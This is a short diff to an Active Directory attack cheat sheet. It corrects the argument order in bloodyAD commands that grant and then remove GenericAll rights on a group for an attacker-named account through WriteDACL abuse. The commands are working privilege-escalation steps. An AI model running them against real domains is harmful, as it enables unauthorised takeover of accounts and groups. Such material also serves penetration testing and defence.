@@ -175,10 +175,10 @@ To abuse `WriteDacl` to a domain object, you may grant yourself the DcSync privi
 * WriteDACL on Group:
 	* Windows/Linux:
 		```ps1
-		bloodyAD --host my.dc.corp -d corp -u devil_user1 -p 'P@ssword123' add genericAll devil_user1 'cn=INTERESTING_GROUP,dc=corp'
+		bloodyAD --host my.dc.corp -d corp -u devil_user1 -p 'P@ssword123' add genericAll 'cn=INTERESTING_GROUP,dc=corp' devil_user1
 		
 		# Remove right
-		bloodyAD --host my.dc.corp -d corp -u devil_user1 -p 'P@ssword123' remove genericAll devil_user1 'cn=INTERESTING_GROUP,dc=corp'
+		bloodyAD --host my.dc.corp -d corp -u devil_user1 -p 'P@ssword123' remove genericAll 'cn=INTERESTING_GROUP,dc=corp' devil_user1
 		```
 	* Windows only:
 		```ps1
